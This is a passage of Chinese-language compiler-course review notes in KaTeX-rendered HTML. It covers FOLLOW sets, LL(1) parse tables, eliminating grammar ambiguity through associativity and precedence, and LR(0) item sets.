style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span></eq>,该定义中，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi></mrow><annotation encoding="application/x-tex">U</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span></eq>必须从S推得才能有<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mtext>集合</mtext></mrow><annotation encoding="application/x-tex">FOLLOW集合</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">FO</span><span class="mord mathnormal">LL</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord cjk_fallback">集合</span></span></span></span></eq></li><li><ol><li>对于文法的开始/识别符号S，令<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">$</mi><mo>∈</mo><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mo stretchy="false">(</mo><mi>S</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\$\in FOLLOW(S)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8056em;vertical-align:-0.0556em;"></span><span class="mord">$</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">FO</span><span class="mord mathnormal">LL</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mclose">)</span></span></span></span></eq></li></ol></li><li><ol start="2"><li>$ A \rightarrow \alpha B \beta <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>则，</mtext></mrow><annotation encoding="application/x-tex">则，</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">则，</span></span></span></span></eq>FIRST(\beta)<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>中的非</mtext></mrow><annotation encoding="application/x-tex">中的非</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">中的非</span></span></span></span></eq>\epsilon<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>元素属于</mtext></mrow><annotation encoding="application/x-tex">元素属于</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">元素属于</span></span></span></span></eq>FOLLOW(B)$</li></ol></li><li><ol start="3"><li>$ A \rightarrow \alpha B <eq><span class="katex-error" title="ParseError: KaTeX parse error: Can&#x27;t use function &#x27;$1#x27; in math mode at position 4: ，或 $̲A\rightarrow \a…" style="color:#cc0000"><span class="cjk_fallback">，或 $A\rightarrow \alpha B \beta</span></span></eq>，而 $ FIRST(\beta) <eq><span class="katex-error" title="ParseError: KaTeX parse error: Can&#x27;t use function &#x27;$1#x27; in math mode at position 4: 含有 $̲ \epsilon $ ，则" style="color:#cc0000"><span class="cjk_fallback">含有 $ \epsilon $ ，则</span></span></eq> FOLLOW(A) $ 的元素属于$ FOLLOW(B) $</li></ol></li></ul></li></ul></li><li><p>构造LL(1)分析表</p></li></ol><ul><li>分析表的构造<br>对于产生式<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><mi>α</mi></mrow><annotation encoding="application/x-tex">A\rightarrow \alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span></span></span></span></eq><ul><li><ol><li>对<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FIRST(\alpha)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span></span></span></span></eq>中的每一个终结符号<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span></eq>,置<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo stretchy="false">[</mo><mi>A</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">]</mo><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>A</mi><mo>→</mo><mi>α</mi><mi mathvariant="normal">&quot;</mi></mrow><annotation encoding="application/x-tex">M[A,a]=&quot;A\rightarrow\alpha&quot;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">[</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord">&quot;</span></span></span></span></eq></li></ol></li><li><ol start="2"><li>如果<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi><mo>∈</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\epsilon \in FIRST(\alpha)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">ϵ</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span></span></span></span></eq>,则对于属于<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FOLLOW(A)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">FO</span><span class="mord mathnormal">LL</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mclose">)</span></span></span></span></eq>的每一个终结符号<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span></eq>或<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">$</mi></mrow><annotation encoding="application/x-tex">\$</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8056em;vertical-align:-0.0556em;"></span><span class="mord">$</span></span></span></span></eq>,分别置<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo stretchy="false">[</mo><mi>A</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">]</mo><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>A</mi><mo>→</mo><mi>α</mi><mi mathvariant="normal">&quot;</mi></mrow><annotation encoding="application/x-tex">M[A,b]=&quot;A\rightarrow\alpha&quot;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">[</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord">&quot;</span></span></span></span></eq>和<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo stretchy="false">[</mo><mi>A</mi><mo separator="true">,</mo><mi mathvariant="normal">$</mi><mo stretchy="false">]</mo><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>A</mi><mo>→</mo><mi>α</mi><mi mathvariant="normal">&quot;</mi></mrow><annotation encoding="application/x-tex">M[A,\$]=&quot;A\rightarrow\alpha&quot;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">[</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">$</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord">&quot;</span></span></span></span></eq></li></ol></li></ul></li></ul><ol start="5"><li>给出分析过程</li></ol><ul><li><p>使用分析表的分析过程</p><table><thead><tr><th>符号栈</th><th>输入串</th><th>分析和动作</th></tr></thead><tbody><tr><td>E$</td><td>id + id * id$</td><td></td></tr><tr><td>…</td><td>…</td><td>…</td></tr></tbody></table></li></ul><h3 id="%E7%AC%AC%E4%B8%89%E9%81%93-%E6%B6%88%E9%99%A4%E6%96%87%E6%B3%95%E4%BA%8C%E4%B9%89%E6%80%A7" tabindex="-1">第三道 消除文法二义性</h3><ol><li>说明二义文法</li></ol><ul><li>文法对同一语句产生不同的语法树，则文法是二义的</li><li>二义性产生原因<ul><li>左右结合性<ul><li>问题：<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>→</mo><mi>E</mi><mo>+</mo><mi>E</mi><mi mathvariant="normal">∣</mi><mi>E</mi><mo>∗</mo><mi>E</mi><mi mathvariant="normal">∣</mi><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">E\rightarrow E +E | E*E|id</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span></span></span></span></eq>在<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>d</mi><mo>+</mo><mi>i</mi><mi>d</mi><mo>+</mo><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">id+id+id</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span></span></span></span></eq>，会产生两个语法树<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>（</mtext><mi>i</mi><mi>d</mi><mo>+</mo><mi>i</mi><mi>d</mi><mtext>）</mtext><mo>+</mo><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">（id+id）+id</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord cjk_fallback">（</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">）</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span></span></span></span></eq> 和 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>d</mi><mo>+</mo><mtext>（</mtext><mi>i</mi><mi>d</mi><mo>+</mo><mi>i</mi><mi>d</mi><mtext>）</mtext></mrow><annotation encoding="application/x-tex">id+（id+id）</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord cjk_fallback">（</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">）</span></span></span></span></eq>，这里两个树不同的是扩展方向</li><li>解决:<ul><li>左结合：将可以递归的非终结符放在终结符的左侧，使运算具有左结合性</li><li>右结合同</li></ul></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>→</mo><mi>E</mi><mo>+</mo><mi>E</mi></mrow><annotation encoding="application/x-tex">E\rightarrow E+E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span></eq>改为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>→</mo><mi>E</mi><mo>+</mo><mi>F</mi><mi mathvariant="normal">∣</mi><mi>F</mi><mo separator="true">,</mo><mi>F</mi><mo>→</mo><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">E\rightarrow E+F|F,F\rightarrow id</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span></span></span></span></eq>,这样就是左结合</li></ul></li><li>优先级：某个算符所在语法树层数越高，越先被运算，这种算符的优先级越高<ul><li>问题： <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>→</mo><mi>E</mi><mo>+</mo><mi>E</mi><mi mathvariant="normal">∣</mi><mi>E</mi><mo>∗</mo><mi>E</mi><mi mathvariant="normal">∣</mi><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">E\rightarrow E +E | E*E|id</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span></span></span></span></eq>在<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>d</mi><mo>+</mo><mi>i</mi><mi>d</mi><mo>∗</mo><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">id+id*id</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span></span></span></span></eq>中会产生两个语法树，这里没有体现*的优先级</li><li>解决：引入新非终结符，增加一个新的子结构</li><li>低优先级的结构靠近开始符号</li><li>高优先级的结构靠近终结符号</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>→</mo><mi>E</mi><mo>+</mo><mi>E</mi><mi mathvariant="normal">∣</mi><mi>E</mi><mo>∗</mo><mi>E</mi><mi mathvariant="normal">∣</mi><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">E\rightarrow E +E | E*E|id</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span></span></span></span></eq>改写为<br><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>→</mo><mi>E</mi><mo>+</mo><mi>T</mi><mi mathvariant="normal">∣</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">E \rightarrow E+T|T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span></eq><br><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo>→</mo><mi>T</mi><mo>∗</mo><mi>F</mi><mi mathvariant="normal">∣</mi><mi>F</mi></mrow><annotation encoding="application/x-tex">T \rightarrow T*F|F</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span></span></span></span></eq><br><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo>→</mo><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">F \rightarrow id</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span></span></span></span></eq><br>这样可以通过设定优先级去除二义性</li></ul></li></ul></li></ul><h3 id="%E7%AC%AC%E5%9B%9B%E9%81%93-%E8%87%AA%E4%B8%8B%E8%80%8C%E4%B8%8A%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90" tabindex="-1">第四道 自下而上语法分析</h3><h4 id="1.2-%E6%B1%82lr(0)%E9%A1%B9%E7%9B%AE%E9%9B%86%EF%BC%8C%E8%AF%86%E5%88%AB%E6%B4%BB%E5%89%8D%E7%BC%80" tabindex="-1">1.2 求LR(0)项目集，识别活前缀</h4><ul><li>求LR(0)项目集<ul><li>如果只求某状态的，仅考虑入边即可</li></ul></li><li>构造LR(0)自动机</li><li>活前缀：跑自动机看能否识别</li></ul><h4 id="3%2C4-%E6%9E%84%E9%80%A0lr%E5%88%86%E6%9E%90%E8%A1%A8%EF%BC%8C%E7%BB%99%E5%87%BAlr%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B" tabindex="-1">3,4 构造LR分析表，给出LR分析过程</h4><h3 id="%E7%AC%AC%E4%BA%94%E9%81%93" tabindex="-1">第五道</h3><ul><li><p>语法知道定义SDD：是一个上下文无关文法的属性及规则的定义</p><ul><li>文法符号具有某些属性<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>X</mi><mi mathvariant="normal">.</mi><mi>a</mi><mo separator="true">,</mo><mi>X</mi><mi mathvariant="normal">.</mi><mi>b</mi><mtext>等</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(X.a, X.b 等)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">.</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" 